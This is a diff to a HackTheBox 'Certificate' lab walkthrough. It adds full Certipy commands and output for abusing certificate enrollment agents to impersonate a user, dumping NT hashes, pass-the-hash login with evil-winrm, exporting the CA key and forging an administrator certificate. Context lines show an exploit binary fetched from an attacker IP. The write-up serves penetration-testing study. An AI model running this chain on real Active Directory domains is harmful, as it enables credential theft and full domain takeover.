@@ -236,16 +236,52 @@ hashcat -m 19900 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
 
 ## Certipy – PFX Requests
 
+### Lion.SK
+
 ```bash
-certipy req -u 'lion.sk@CERTIFICATE.HTB' -p "!QA..." ...
-certipy req ... -on-behalf-of 'CERTIFICATE\ryan.k'
-certipy auth -pfx 'ryan.k.pfx' -dc-ip '10.10.11.71'
+certipy req -u 'lion.sk@CERTIFICATE.HTB' -p "\!QA<pass>" -dc-ip '10.10.11.71' -target 'DC01.CERTIFICATE.HTB' -ca 'Certificate-LTD-CA' -template 'Delegated-CRA'
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 24
+[*] Got certificate with UPN 'Lion.SK@certificate.htb'
+[*] Certificate object SID is 'S-1-5-21-515537669-4223687196-3249690583-1115'
+[*] Saved certificate and private key to 'lion.sk.pfx'
 ```
 
-→ Got `ryan.k` hash  
-→ Logged in via WinRM as `ryan.k`
+### Ryan.K
 
----
+```bash
+certipy req -u 'lion.sk@CERTIFICATE.HTB' -p "\!QA<pass>" -dc-ip '10.10.11.71' -target 'DC01.CERTIFICATE.HTB' -ca 'Certificate-LTD-CA' -template 'SignedUser' -pfx 'lion.sk.pfx' -on-behalf-of 'CERTIFICATE\ryan.k'
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 25
+[*] Got certificate with UPN 'ryan.k@certificate.htb'
+[*] Certificate object SID is 'S-1-5-21-515537669-4223687196-3249690583-1117'
+[*] Saved certificate and private key to 'ryan.k.pfx'
+```
+
+### NTLM hash dump
+
+```bash
+certipy auth -pfx 'ryan.k.pfx' -dc-ip '10.10.11.71'
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Using principal: ryan.k@certificate.htb
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'ryan.k.ccache'
+[*] Trying to retrieve NT hash for 'ryan.k'
+[*] Got hash for 'ryan.k@certificate.htb': aad3b435b51404eea<hash>
+```
+### WinRM:
+
+```bash
+evil-winrm -i 10.10.11.71 -u ryan.k -H [ryan.k_hash]
+```
 
 ## Privilege Escalation
 
@@ -262,24 +298,46 @@ curl 10.10.14.8/SeManageVolumeExploit.exe -O ...
 
 Test:
 ```powershell
-echo "test" > C:\Windows	est.txt
+echo "test" > C:\Windows\test.txt
+type C:\Windows\test.txt
 ```
 
 ---
 
-## Export CA & Forge Admin Certificate
+## Export CA
 
 ```powershell
-certutil -exportPFX my "Certificate-LTD-CA" C:	emp\ca.pfx
-certipy forge -ca-pfx ca.pfx -upn 'administrator@certificate.htb' -out forged_admin.pfx
+mkdir /temp
+certutil -exportPFX my "Certificate-LTD-CA" C:temp\ca.pfx
 ```
 
-Get NTLM hash:
+## Download CA
+
+```powershell
+download ca.pfx
+```
+## Admin PFX forge
+
 ```bash
-certipy auth -dc-ip '10.10.11.71' -pfx forged_admin.pfx ...
+certipy forge -ca-pfx ca.pfx -upn 'administrator@certificate.htb' -out forged_admin.pfx
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Saved forged certificate and private key to 'forged_admin.pfx'
 ```
 
----
+## Admin NTLM hash dump
+
+```bash
+certipy auth -dc-ip '10.10.11.71' -pfx 'forged_admin.pfx' -username 'administrator' -domain 'certificate.htb'
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Using principal: administrator@certificate.htb
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@certificate.htb': aad3b435b51404eeaad<hash>
+```
 
 ## Root / Administrator Access
 
